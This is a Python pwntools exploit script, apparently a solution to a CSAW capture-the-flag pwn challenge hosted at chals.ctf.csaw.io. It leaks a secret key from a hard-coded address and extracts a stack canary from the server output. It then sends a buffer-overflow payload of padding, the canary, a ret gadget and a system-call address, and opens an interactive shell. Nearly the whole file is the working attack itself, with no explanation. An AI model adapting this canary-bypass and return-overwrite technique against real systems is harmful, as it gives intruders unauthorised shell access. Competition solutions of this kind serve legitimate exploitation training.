from pwn import *
import re

context.update(arch='amd64', os='linux')
context.terminal = ['cmd.exe', '/c', 'start']

secret_key_addr = 0x4040b8
ret_gadget = 0x40101a               
system_call_addr = 0x401437         
def solve():
    p = remote('chals.ctf.csaw.io', 21006)


    p.recvuntil(b'address\n')
    p.send(p64(secret_key_addr))

    output_after_leak = p.recvuntil(b'unlocks\n')
    key_line = output_after_leak.split(b'\n')[0]
    secret_key = int(key_line.strip(), 16)

    p.send(p64(secret_key))

    output_with_canary = p.recvuntil(b'story.\n')
    
    match = re.search(b'for you: 0x([0-9a-f]+)', output_with_canary)
    if not match:
        p.close()
        return

    canary = int(match.group(1), 16)

    payload = flat([
        b'A' * 64,          
        canary,             
        b'B' * 8,          
        ret_gadget,         
        system_call_addr     
    ])
    
    p.sendline(payload)
    p.interactive()
    
if __name__ == "__main__":
    solve()